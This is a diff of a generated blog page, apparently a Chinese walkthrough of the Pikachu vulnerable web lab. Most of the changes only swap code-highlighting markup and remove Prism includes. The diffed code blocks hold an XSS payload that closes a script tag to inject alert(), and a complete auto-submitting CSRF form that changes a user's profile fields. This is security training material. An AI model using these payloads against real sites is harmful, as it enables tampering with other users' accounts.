@@ -344,7 +344,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.3k
+                    5.4k
                 </div>
                 
 
@@ -360,9 +360,6 @@
         </div>
         <hr class="clearfix">
 
-        
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
         
 
         
@@ -498,20 +495,20 @@
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144368.png"></p>
 <h3 id="十一、xss之js输出"><a href="#十一、xss之js输出" class="headerlink" title="十一、xss之js输出"></a>十一、xss之js输出</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144286.png"></p>
 <p>先随便输入，得到回显，然后通过源代码找到这一处位置</p>
-<pre class="line-numbers language-highlight html"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><code class="language-highlight html"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span>
-<span class="language-javascript">    $ms=<span class="string">&#x27;&#x27;</span>;</span>
-<span class="language-javascript">    <span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>){</span>
-<span class="language-javascript">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>){</span>
-<span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span>
-<span class="language-javascript">        }<span class="keyword">else</span> {</span>
-<span class="language-javascript"><span class="comment">//            alert($ms);</span></span>
-<span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span>
-<span class="language-javascript">        }</span>
-<span class="language-javascript"></span>
-<span class="language-javascript">    }</span>
-<span class="language-javascript"></span>
-<span class="language-javascript"></span>
-<span class="language-javascript"></span><span class="tag"></<span class="name">script</span>></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    $ms<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmac确实厉害,看那小眼神..'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+<span class="token comment">//            alert($ms);</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+
+    <span class="token punctuation">&#125;</span>
+
+
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们可以得知$ms即是我们在文本框写入的内容， 且此内容在js标签内，所以我们需要闭合一下</p>
 <p>构造  <!--</script><script>alert("我是弹窗")</script>--></p>
@@ -537,24 +534,24 @@
 <p>然后利用BP抓包修改一下</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301457290.png"></p>
 <p>因为post无法像get那般，所以我们需要自己创建一个恶意站点，在pikachu文件夹vul&#x2F;csrf&#x2F;csrfpost下创建一个html文件，使被攻击用户点击</p>
-<pre class="line-numbers language-highlight html"><span class="tag">&lt;<span class="name"><code class="language-highlight html"><span class="tag">&lt;<span class="name">html</span>></span>
-<span class="tag"><<span class="name">head</span>></span>
-<span class="tag"><<span class="name">script</span>></span><span class="language-javascript"></span>
-<span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span>
-<span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"postsubmit"</span>).<span class="title function_">click</span>();</span>
-<span class="language-javascript">}</span>
-<span class="language-javascript"></span><span class="tag"></<span class="name">script</span>></span>
-<span class="tag"></<span class="name">head</span>></span>
-<span class="tag"><<span class="name">body</span>></span>
-<span class="tag"><<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"csrf_post_edit.php"</span>></span>  //这一处因人而异
-<span class="tag"><<span class="name">input</span> <span class="attr">id</span>=<span class="string">"sex"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"girl"</span> /></span>
-<span class="tag"><<span class="name">input</span> <span class="attr">id</span>=<span class="string">"phonenum"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"phonenum"</span> <span class="attr">value</span>=<span class="string">"18656565545"</span> /></span>
-<span class="tag"><<span class="name">input</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">value</span>=<span class="string">"US"</span> /></span>
-<span class="tag"><<span class="name">input</span> <span class="attr">id</span>=<span class="string">"email"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"lili@pikachu.com"</span> /></span>
-<span class="tag"><<span class="name">input</span> <span class="attr">id</span>=<span class="string">"postsubmit"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /></span>
-<span class="tag"></<span class="name">form</span>></span>
-<span class="tag"></<span class="name">body</span>></span>
-<span class="tag"></<span class="name">html</span>></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  //这一处因人而异
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>18656565545<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>US<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lili@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后我们登录vince用户</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301503808.png"></p>
@@ -947,9 +944,6 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
